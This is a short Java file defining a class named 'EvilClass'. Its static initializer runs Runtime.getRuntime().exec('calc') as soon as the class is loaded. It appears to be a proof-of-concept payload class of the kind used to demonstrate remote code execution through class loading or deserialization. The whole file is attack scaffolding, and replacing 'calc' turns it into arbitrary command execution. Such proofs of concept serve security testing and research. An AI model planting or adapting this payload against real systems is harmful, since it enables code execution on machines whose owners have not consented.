

import java.io.IOException;

public class EvilClass {
	static {
		try {
			Runtime.getRuntime().exec("calc");
		} catch (IOException e) {
			throw new RuntimeException(e);
		}
	}
}
